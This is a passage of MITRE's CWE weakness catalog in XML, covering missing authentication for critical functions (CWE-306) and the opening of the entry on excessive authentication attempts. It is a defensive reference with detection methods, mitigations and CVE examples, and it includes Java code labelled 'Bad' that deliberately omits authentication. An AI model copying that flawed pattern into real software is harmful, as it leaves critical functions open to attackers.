					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="306" Name="Missing Authentication for Critical Function" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.</Description>
	 <Extended_Description>
	   <xhtml:p>As data is migrated to the cloud, if access does not require authentication, it can be easier for attackers to access the data from anywhere on the Internet.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Other</Impact>
               <Note>Exposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, access to administrative or other privileged functionality, or possibly even execution of arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.2">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-6.1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.</xhtml:p>
                  <xhtml:p>Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.</xhtml:p>
                  <xhtml:p>In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Where possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks.</xhtml:p>
                  <xhtml:p>In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.5">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
	    <Mitigation>
	     <Phase>Implementation</Phase>
	     <Phase>System Configuration</Phase>
	     <Phase>Operation</Phase>
	      <Description>When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302].</Description>
	    </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public BankAccount createBankAccount(String accountNumber, String accountType,<xhtml:br/>String accountName, String accountSSN, double balance) {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount account = new BankAccount();<xhtml:br/>account.setAccountNumber(accountNumber);<xhtml:br/>account.setAccountType(accountType);<xhtml:br/>account.setAccountOwnerName(accountName);<xhtml:br/>account.setAccountOwnerSSN(accountSSN);<xhtml:br/>account.setBalance(balance);<xhtml:br/>
                           <xhtml:br/>return account;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.</Body_Text>
               <Body_Text>The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>private boolean isUserAuthentic = false;<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// authenticate user,</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// if user is authenticated then set variable to true</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// otherwise set variable to false</xhtml:i>
                     <xhtml:br/>public boolean authenticateUser(String username, String password) {<xhtml:div style="margin-left:1em;">...</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public BankAccount createNewBankAccount(String accountNumber, String accountType,<xhtml:br/>String accountName, String accountSSN, double balance) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount account = null;<xhtml:br/>
                           <xhtml:br/>if (isUserAuthentic) {<xhtml:div style="margin-left:1em;">account = new BankAccount();<xhtml:br/>account.setAccountNumber(accountNumber);<xhtml:br/>account.setAccountType(accountType);<xhtml:br/>account.setAccountOwnerName(accountName);<xhtml:br/>account.setAccountOwnerSSN(accountSSN);<xhtml:br/>account.setBalance(balance);</xhtml:div>}<xhtml:br/>return account;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors did not use any authentication for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-155">
	      <Intro_Text>In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.</Intro_Text>
	      <Example_Code Nature="Bad" Language="Other">
                <xhtml:div>A security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]</xhtml:div>
	      </Example_Code>
	      <Body_Text>While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.</Body_Text>
	      <Example_Code Nature="Good" Language="Other">
                <xhtml:div>The sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]</xhtml:div>
	      </Example_Code>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29951</Reference>
               <Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29952</Reference>
               <Description>Condition Monitor firmware uses a protocol that does not require authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30276</Reference>
               <Description>SCADA-based protocol for bridging WAN and LAN traffic has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30276</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30313</Reference>
               <Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30317</Reference>
               <Description>Distributed Control System (DCS) uses a protocol that has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1810</Reference>
               <Description>MFV. Access TFTP server without authentication and obtain configuration file with sensitive plaintext information.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6827</Reference>
               <Description>Agent software running at privileges does not authenticate incoming requests over an unprotected channel, allowing a Shatter" attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6827</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0213</Reference>
               <Description>Product enforces restrictions through a GUI but not through privileged APIs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-15483</Reference>
               <Description>monitor device allows access to physical UART debug port without authentication</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-15483</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-9201</Reference>
               <Description>Programmable Logic Controller (PLC) does not have an authentication feature on its communication protocols.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-9201</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>No Authentication for Critical Function</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP31</Entry_ID>
               <Entry_Name>Missing authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="12"/>
            <Related_Attack_Pattern CAPEC_ID="166"/>
            <Related_Attack_Pattern CAPEC_ID="216"/>
            <Related_Attack_Pattern CAPEC_ID="36"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authentication,&#34; Page 36"/>
            <Reference External_Reference_ID="REF-257"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1295"/>
            <Reference External_Reference_ID="REF-1296"/>
            <Reference External_Reference_ID="REF-1297"/>
            <Reference External_Reference_ID="REF-1298"/>
            <Reference External_Reference_ID="REF-1302"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-02-16">No Authentication for Critical Function</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="307" Name="Improper Restriction of Excessive Authentication Attempts" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it more susceptible to brute force attacks.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="799" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could perform an arbitrary number of authentication attempts using different passwords, and eventually gain access to the targeted account.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Common protection mechanisms include:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Disconnecting the user after a small number of failed attempts</xhtml:li>
                        <xhtml:li>Implementing a timeout</xhtml:li>
                        <xhtml:li>Locking out a targeted account</xhtml:li>
                        <xhtml:li>Requiring a computational task on the user's part.</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator. [REF-45]</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-117">
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>
               <References>
                  <Reference External_Reference_ID="REF-236"/>
               </References>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code, extracted from a servlet's doPost() method, performs an authentication lookup every time the servlet is invoked.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String username = request.getParameter("username");<xhtml:br/>String password = request.getParameter("password");<xhtml:br/>
